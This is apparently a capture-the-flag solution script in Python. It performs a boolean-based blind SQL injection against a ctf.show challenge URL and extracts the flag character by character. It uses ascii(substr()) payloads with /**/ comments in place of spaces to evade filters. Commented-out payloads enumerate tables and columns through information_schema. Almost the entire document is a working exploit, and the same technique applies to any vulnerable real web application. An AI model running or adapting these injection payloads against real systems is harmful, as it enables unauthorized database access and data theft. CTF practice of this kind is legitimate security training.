'''
@Descripttion: 
@version: 
@Author: chalan630
@Date: 2020-02-22 12:16:55
@LastEditTime: 2020-02-22 13:16:30
'''
import requests

s=requests.session()
table=""
url = "https://8888eb4d-ca1a-4dcb-afd8-da21cf5cb386.chall.ctf.show/"

for i in range(1,45):
    print(i)
    for j in range(44,126):
        # payload = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#"%(str(i),str(j))  
        # payload = "ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x666c6167) from %s for 1))=%s#"%(str(i), str(j))
        payload = "ascii(substr((select flag from flag) from %s for 1))=%s#"%(str(i), str(j))
        payload = payload.replace(' ','/**/')
        ra = s.get(url=url + '?id=0/**/or/**/' + payload).text
        if 'I asked nothing' in ra:
            table += chr(j)
            print(table)
            break
